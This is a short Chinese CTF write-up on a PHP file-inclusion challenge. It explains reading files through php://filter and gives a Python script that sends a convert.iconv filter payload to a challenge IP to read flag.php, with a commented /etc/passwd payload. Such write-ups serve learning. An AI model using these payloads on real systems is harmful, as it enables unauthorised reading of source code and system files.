# file_include

知识点：convert.iconv.* 绕过

[详解php://filter以及死亡绕过](https://blog.csdn.net/woshilnp/article/details/117266628)

[writeup](https://blog.csdn.net/yuanxu8877/article/details/127607264)

`php://filter/convert.base64-encode/resource=index.php`如果没有过滤的话，可直接读取当前文件内容，同理一旦绕过过滤，check.php和flag.php就都能读到了，详细绕过过滤的教程见上面。

```python
import requests

# 目标URL
url = "http://61.147.171.105:60022/"
# payload= {'filename': '/etc/passwd'}
payload= {'filename': 'php://filter/convert.iconv.SJIS*.UCS-4*/resource=flag.php'}

response = requests.get(url, params=payload)
print(response.text)
```

